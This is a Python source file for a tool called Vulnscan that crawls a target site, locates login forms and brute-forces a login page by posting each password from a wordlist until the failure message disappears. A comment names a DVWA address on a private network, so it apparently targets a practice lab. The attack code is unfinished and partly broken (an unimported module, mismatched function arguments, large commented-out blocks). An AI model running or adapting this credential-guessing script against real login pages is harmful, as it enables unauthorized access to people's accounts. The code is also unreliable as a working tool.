from spider import Spider
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urljoin

class Args:
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-u','--url',dest = 'url', help = 'Enter target URL.')
        options = parser.parse_args()
        self.url = options.url

class Vulnscan:
	def __init__(self,url):
		self.spider = Spider(url)
		self.url = url
		self.storeLinks = self.spider.storeLinks

	def runSpider(self): # run spider will test the site and return list of what it can access
		self.spider.run()
		self.storeLinks = self.spider.storeLinks
		if len(self.storeLinks) > 0:
			return self.storeLinks
		else:
			print('List is empty, check link and try again')

	def postData(self):
		html = self.spider.reqGet(self.url)
		bsparse = BeautifulSoup(html,"html.parser")
		postData = {}
		print(bsparse)

	def sessionSpider(self,lst): # session spider will take a list and try to login and gather more links
		credsList = []
		for link in lst:
			response = self.spider.reqGet(link)
			if b'action=' in response and b'login.php' in response:
				#print(link)
				bs = BeautifulSoup(response,'html.parser')
				forms = bs.findAll('form') # use forms even if one item , list
				if len(forms) == 1:
					action = forms[0].get('action')
					if 'login' in action:
						form = forms[0]
						action = form.get('action')
						fullurl = (urljoin(link, action))
						inputList = form.findAll('input')
						#print(inputList)
						print(fullurl)
						postData = {}
						for i in inputList:
							print(i.get('name')) # pass in the name of each input into dict of data
							#print(i.get('type'))
							#print(i.get('value'))
						# 	if inputType == 'text':
						# 		inputValue = 'test'
						# 	postData[inputName] = inputValue
						

				
				# print(link)
				# if len(forms) == 1:
				# 	action = forms[0].get('action')
				# 	actionUrl = urljoin(link,action)
				# 	#print(url)
				# print(self.returnCreds(actionUrl))

	def login(self,url=None):
		if url == None:
			url = self.url
		response = self.spider.session.post(url,data=self.returnCreds(url))
		return response.status_code, BeautifulSoup(response.content,"html.parser")
	
	def returnCreds(self,url,user,userField='username',passwordField='password',submitField='Login'):
		data = {
		userField: user, #name="username"
		passwordField: "", #name="blah", use with password list
		submitField: "submit" #name = "blah"
		}
		with open('/opt/wordlists/passwords.txt','r') as rf:
				for password in rf:
					password = password.strip()
					data['password'] = password
					resp = requests.post(url,data = data,timeout=5) #http://192.168.86.115/dvwa/login.php, passing in data dictionary to post request
					if b'Login failed' not in resp.content and b'Authentication Error' not in resp.content:#<div class="message">Login failed</div>, if password is successful:
						return (f'URL: {url}\nStatus code: {resp.status_code}\nCredentials: {data}\n')
					
				return (f'Password not found')


#########################################################RUN#######################################################

args = Args()
v1 = Vulnscan(args.url)
#creds = (v1.returnCreds(args.url))
v1.runSpider()
v1.sessionSpider(v1.storeLinks)
#print(creds)
#v1.sessionSpider(creds)
#response = v1.spider.session.post(args.url,data=self.returnCreds)
#print(response.content)
#v1.listLinks(v1.storeLinks)
#v1.postData()
#v1.login()




